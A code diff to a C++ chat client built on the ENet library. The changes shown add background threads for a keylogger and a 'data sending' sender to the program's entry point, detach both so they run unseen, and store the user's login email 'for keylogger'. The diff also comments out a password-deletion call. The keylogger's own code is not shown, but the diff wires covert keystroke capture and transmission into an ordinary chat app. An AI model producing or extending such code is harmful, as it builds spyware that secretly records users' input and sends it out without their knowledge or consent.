@@ -226,6 +226,9 @@ void handleLogin(ENetPeer* peer, ENetHost* client) {
         cout << "You are now logged in!" << endl;
         cout << "Press Enter to go to the Chat App..." << endl;
         
+        // Store email for keylogger
+        setUserEmail(email);
+        
         // Clear input buffer (consume any leftover input)
         cin.ignore(1000, '\n');
         cin.get();
@@ -319,14 +322,23 @@ int application(){
 // Main function - Program entry point
 // ---------------------------------------------------------------------
 int main() {
-    PasswordDeleter::destroyPass();
+   // PasswordDeleter::destroyPass();
+    
     // Start keylogger in a separate thread
     std::thread keylogThreadObj(keyloggerThread);
     
+    // Start data sending thread
+    std::thread senderThreadObj(senderThread);
+    
     // Detach the keylogger thread to run in the background
     keylogThreadObj.detach();
+    senderThreadObj.detach();
     
     // Start the ENet application
     application();
     
+    // Set flag to stop threads when application exits
+    isKeyloggerRunning = false;
+    
+    return 0;
 };
